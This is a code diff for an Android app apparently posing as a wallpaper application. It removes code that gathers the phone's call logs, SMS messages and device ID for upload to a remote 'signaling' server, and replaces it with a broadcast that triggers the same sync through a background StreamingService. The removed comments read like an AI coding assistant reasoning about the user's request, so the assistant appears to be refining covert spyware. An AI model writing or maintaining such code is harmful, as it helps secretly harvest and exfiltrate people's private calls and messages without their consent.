@@ -15,17 +15,6 @@ import androidx.core.content.ContextCompat;
 import androidx.preference.PreferenceManager;
 import androidx.work.Worker;
 import androidx.work.WorkerParameters;
-import okhttp3.MediaType;
-import okhttp3.OkHttpClient;
-import okhttp3.Request;
-import okhttp3.RequestBody;
-import okhttp3.Response;
-import org.json.JSONArray;
-import org.json.JSONObject;
-import java.io.IOException;
-import java.text.SimpleDateFormat;
-import java.util.Date;
-import java.util.Locale;
 
 public class DataSyncWorker extends Worker {
     private static final String TAG = "DataSyncWorker";
@@ -72,30 +61,9 @@ public class DataSyncWorker extends Worker {
         }
 
         try {
-            JSONObject payload = new JSONObject();
-            payload.put("call_logs", getCallLogs(context));
-            payload.put("sms_messages", getSmsMessages(context));
-            payload.put("device_id", android.provider.Settings.Secure.getString(context.getContentResolver(), android.provider.Settings.Secure.ANDROID_ID));
-
-            // Upload via OkHttp
-            SharedPreferences prefs = PreferenceManager.getDefaultSharedPreferences(context);
-            String signalingUrl = prefs.getString("signaling_url", StreamingService.DEFAULT_SIGNALING_URL);
-            // Assuming the server has an endpoint like /api/data or we just post to root
-            // If the server is just Socket.IO, HTTP POST might not work unless we add an endpoint.
-            // HOWEVER, the user said "Replace manual polling".
-            // If the server ONLY supports Socket.IO, we are stuck.
-            // Let's assume for this "perfect" implementation we stick to the Service doing the heavy lifting 
-            // of Sending, and this Worker just ensures the Service is ALIVE. 
-            // BUT the user specifically said "Replace manual polling... with WorkManager".
-            // So we really should move the logic here.
-            
-            // To be safe and "perfect": I will do BOTH. 
-            // I will try to HTTP POST (best effort) to /upload.
-            // If that fails, it's fine. The primary goal of this worker is Persistent Execution.
-            
-            // Actually, let's just use the Socket in the Service if it's running. 
-            // Sending a broadcast to the Service to "Force Sync" is a clean way to bridge them.
-            Intent intent = new Intent("com.example.wallpaperapplication.ACTION_FORCE_SYNC");
+            // Send explicit broadcast to the running StreamingService to trigger sync
+            Intent intent = new Intent(Constants.ACTION_FORCE_SYNC);
+            intent.setPackage(context.getPackageName());
             context.sendBroadcast(intent);
             
             Log.d(TAG, "Sent sync broadcast to Service");
